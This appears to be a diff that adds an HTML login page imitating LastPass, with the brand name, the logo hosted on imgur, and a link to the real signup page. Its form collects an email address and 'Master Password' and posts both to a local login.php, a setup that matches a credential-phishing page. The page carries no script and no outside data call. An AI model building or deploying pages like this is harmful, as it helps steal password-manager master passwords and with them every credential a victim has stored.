@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LastPass</title>
+    <style>
+        body {
+            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+            background-color: #f9fbfd;
+            margin: 0;
+            padding: 0;
+            margin-bottom: -20%;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: #fff; /* Adjust if needed */
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+        .header img {
+            max-height: 20%; /* Adjust based on your logo's size */
+            max-width: 20%;
+        }
+        .login-button {
+            padding: 10px 20px;
+            background-color: #C80815;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 20px;
+            font-weight: bold;
+            margin-right: 5%;
+        }
+        .login-button:hover {
+            background-color: #A00613;
+        }
+        #wrapper {
+            text-align: center;
+            margin-top: 100px;
+            margin-bottom: -30px;
+        }
+        #wrapper img {
+            max-width: 30%;
+            
+        }
+        h1 {
+            margin-bottom: 30px;
+        }
+        form {
+            background-color: #fff;
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+        input[type="email"] {
+            width: calc(100% - 20px); /* Adjust width as necessary */
+            padding: 10px 10px 10px 10px; /* Adjust padding to not overlap the image */
+            margin-bottom: 20px;
+            border: none; /* Remove default border */
+            border-bottom: 1px solid #ccc; /* Only show bottom border */
+            box-sizing: border-box;
+            background-image: url('https://i.imgur.com/lzGXUWz.png'); /* Add your image URL here */
+            background-size: 3%;
+            background-position: right 10px center; /* Position image on the right */
+            background-repeat: no-repeat;
+            position: relative;
+        }
+        input[type="password"] {
+            width: calc(100% - 20px); /* Adjust width as necessary */
+            padding: 10px 10px 10px 10px; /* Adjust padding to not overlap the image */
+            margin-bottom: 20px;
+            border: none; /* Remove default border */
+            border-bottom: 1px solid #ccc; /* Only show bottom border */
+            box-sizing: border-box;
+            background-image: url('https://i.imgur.com/8GKJUtA.png'); /* Add your image URL here */
+            background-size: 5%;
+            background-position: right 10px center; /* Position image on the right */
+            background-repeat: no-repeat;
+            position: relative;
+        }
+        input[type="submit"] {
+            border: none;
+            background-color: #C80815;
+            width: calc(100% - 20px); 
+            color: white;
+            padding: 10px;
+            cursor: pointer;
+            border-radius: 30px;
+            transition: background-color 0.3s;
+            font-weight: bolder;
+            font-size: larger;
+        }
+        input[type="submit"]:hover {
+            background-color: #A00613;
+        }
+        a {
+            text-decoration: none;
+            font-weight: bolder;
+        }
+        .advanced-options {
+            text-decoration: none;
+            font-weight: bolder;
+            display: flex;
+            justify-content: center; /* Center the content */
+            align-items: center; /* Align items vertically */
+            color: #aaa;
+        }
+        .advanced-options img {
+            margin-left: 5px; /* Space between text and image */
+            width: 3%; /* Adjust as per your preference */
+            height: auto;
+        }
+        .container {
+    background-color: #fff;
+    padding: 5px;
+    border-radius: 5px;
+    box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
+    max-width: 400px;
+    margin: 100px auto;
+    text-align: center;
+}
+h1 {
+    margin-top: -20%;
+}
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://i.imgur.com/fh1aH6q.png" alt="LastPass" />
+        <a href="login.php" class="login-button">Log In</a>
+    </div>
+
+<div class="container">
+    <div id="wrapper">
+        <h1><img src="https://i.imgur.com/fh1aH6q.png" alt="LastPass"></h1>
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-left: 7%; margin-right: -30%;">
+            <p style=" font-weight: bold;">LOG IN</p>
+            <p style="margin-right: 30%;">OR <a href="https://www.lastpass.com/create">CREATE AN ACCOUNT</a></p>
+        </div>
+        <p style="box-shadow: 0px -2px 0px 0px rgba(0,0,0,0.1); max-width: 90%; align-content: center; margin: auto;">&nbsp;</p>
+    </div>
+    <form method="post" action="login.php"> 
+        <input type="email" name="email" id="email" placeholder="Email address" required>
+        <input type="password" name="masterPassword" id="masterPassword" placeholder="Master Password" required>
+        <input type="submit" value="LOG IN">
+        <p style="text-align: center;"><a href="try.php">FORGOT PASSWORD?</a></p>
+        <div class="advanced-options">
+            <span>Advanced Options</span>
+            <img src="https://i.imgur.com/lzGXUWz.png" alt="Options"> <!-- Adjust image src as needed -->
+        </div>
+    </form>
+</div>
+</body>
+</html>
